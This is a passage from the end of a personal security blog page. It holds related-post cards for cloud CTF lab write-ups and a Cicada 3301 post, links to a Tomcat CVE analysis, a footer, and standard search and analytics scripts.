mb-3" data-toc-skip>Lab - CTFÔºöFlaw2.cloud [attacker and defender]</h3><div class="text-muted small"><p> [toc] CTFÔºöFlaw2 Attacker Track Level 1 - sourse code api input error http://level1.flaws2.cloud/ For this level, you'll need to enter the correct PIN code. The correct PIN is 1...</p></div></div></a></div><div class="card"> <a href="/posts/cicada3301/"><div class="card-body"> <span class="timeago small" >Apr 2, 2021<i class="unloaded">2021-04-02T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - Cicada 3301</h3><div class="text-muted small"><p> [toc] ref Cicada 3301:‰∏ÄÂè™ÊΩú‰ºè‰∫é‰∫íËÅîÁΩëÊ∑±Â§ÑÁöÑ‚ÄúËùâ‚ÄùÔºà‰∏ÄÔºâ Ëùâ3301Ôºà2012 PUZZLESÔºâ:‰∫íËÅîÁΩëÂè≤‰∏äÊúÄÂ§çÊùÇÊúÄÁ•ûÁßòÊúÄÂèØÊÄïÁöÑË∞úÂõ¢ Cicada 3301 2012Âπ¥1Êúà4Êó• Â∞ÜËøôÂº†ÂõæÁâáÁî®ËÆ∞‰∫ãÊú¨ÊâìÂºÄÔºåÂú®‰∏ÄÂ†Ü‰π±Á†ÅÂêéÈù¢ÔºåÈöêËóèÁùÄ‰∏ÄÊù°ËÆØÊÅØÔºö ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CVE-2020-9484/" class="btn btn-outline-primary" prompt="Older"><p>Vul - CVE-2020-9484 Tomcat RCEÊºèÊ¥ûÂàÜÊûê</p></a> <a href="/posts/flaw/" class="btn btn-outline-primary" prompt="Newer"><p>Lab - CTFÔºöFlaw1.cloud [Level 1 - Level 6]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
